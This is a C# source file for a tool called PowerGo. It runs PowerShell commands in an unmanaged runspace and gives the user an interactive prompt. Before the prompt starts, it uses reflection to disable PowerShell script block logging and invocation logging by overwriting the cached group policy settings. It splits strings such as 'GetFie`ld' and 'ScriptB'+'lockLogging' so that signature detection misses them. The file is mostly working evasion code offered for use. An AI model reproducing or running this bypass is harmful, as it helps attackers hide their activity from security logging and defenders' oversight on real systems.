﻿using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;

namespace PowerGo
{
    class Program
    {
        static PS ps;

        [DllImport("kernel32.dll",
            EntryPoint = "GetStdHandle",
            SetLastError = true,
            CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32.dll",
            EntryPoint = "AllocConsole",
            SetLastError = true,
            CharSet = CharSet.Auto,
            CallingConvention = CallingConvention.StdCall)]

        private static extern int AllocConsole();
        private const int STD_OUTPUT_HANDLE = -11;
        private const int MY_CODE_PAGE = 437;

        public static void getNewConsole()
        {
            AllocConsole();
            IntPtr stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
            SafeFileHandle safeFileHandle = new SafeFileHandle(stdHandle, true);
            FileStream fileStream = new FileStream(safeFileHandle, FileAccess.Write);
            Encoding encoding = System.Text.Encoding.GetEncoding(MY_CODE_PAGE);
            StreamWriter standardOutput = new StreamWriter(fileStream, encoding);
            standardOutput.AutoFlush = true;
            Console.SetOut(standardOutput);
        }

        public static void interact()
        {
            ps.exe("$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').\"GetFie`ld\"('cachedGroupPolicySettings', 'N' + 'onPublic,Static')");
            ps.exe("$GroupPolicyCache = $GroupPolicyField.GetValue($null)");
            ps.exe("$val = [System.Collections.Generic.Dictionary[string, System.Object]]::new()");
            ps.exe("$val.Add('EnableScriptB' + 'lockLogging', 0)");
            ps.exe("$val.Add('EnableScriptB' + 'lockInvocationLogging', 0)");
            ps.exe("$GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB' + 'lockLogging'] = $val");

            string cmd = "";
            while (cmd.ToLower() != "exit")
            {
                Console.Write("PS " + ps.exe("$(get-location).Path").Replace(System.Environment.NewLine, String.Empty) + ">");
                cmd = Console.ReadLine();
                Console.WriteLine(ps.exe(cmd));
            }
        }

        //from https://github.com/p3nt4/PowerShdll
        public class PS
        {
            Runspace runspace;

            public PS()
            {
                this.runspace = RunspaceFactory.CreateRunspace();
                this.runspace.Open();

            }
            public string exe(string cmd)
            {
                try
                {
                    Pipeline pipeline = runspace.CreatePipeline();
                    pipeline.Commands.AddScript(cmd);
                    pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        foreach (string line in obj.ToString().Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None))
                        {
                            stringBuilder.AppendLine(line.TrimEnd());
                        }
                    }
                    string cleanOutput = "";
                    using (StringReader reader = new StringReader(stringBuilder.ToString()))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            cleanOutput = line.Trim() + "\n";
                        }
                    }
                    return stringBuilder.ToString();
                }
                catch (Exception e)
                {
                    string errorText = e.Message + "\n";
                    return (errorText);
                }
            }
            public void close()
            {
                this.runspace.Close();
            }
        }

        static void Main(string[] args)
        {
            ps = new PS();
            getNewConsole();
            interact();
        }
    }
}
